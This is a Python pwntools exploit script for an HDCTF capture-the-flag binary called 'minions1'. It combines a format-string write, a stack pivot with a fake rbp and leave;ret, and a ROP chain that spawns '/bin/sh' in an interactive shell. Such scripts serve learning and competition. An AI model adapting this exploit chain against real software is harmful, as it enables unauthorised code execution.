#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
# gdb.attach(p)
# pause()

p = process('./minions1')
elf = ELF('./minions1')
key = 0x6010A0
shell = 0x400763
hdctf = 0x6010C0
fake_rbp = 0x601908
leave_ret = 0x400758
prdi_ret = 0x400893
main_puts_read = 0x4007DE

p.recvuntil("Welcome to HDCTF.What you name?\n\n")
payload = fmtstr_payload(6, {key : 102}, numbwritten = 0)
p.send(payload)

p.recvuntil("Hello,")
p.recvuntil("\nDo you have an invitation key?\n")

p.recvuntil("welcome,tell me more about you\n")
payload1 = 'A'*0x30 + p64(fake_rbp) + p64(main_puts_read)
p.send(payload1)
p.recvuntil("That's great.Do you like Minions?\n")
payload2 = '/bin/sh\x00'
p.send(payload2)

#main_puts_read
p.recvuntil("welcome,tell me more about you\n")
payload3 = p64(prdi_ret) + p64(hdctf) + p64(shell) + p64(0)*3 + p64(fake_rbp-0x30-0x8) + p64(leave_ret)
p.send(payload3)
p.recvuntil("That's great.Do you like Minions?\n")
payload4 = '/bin/sh\x00'
p.send(payload4)

p.interactive()
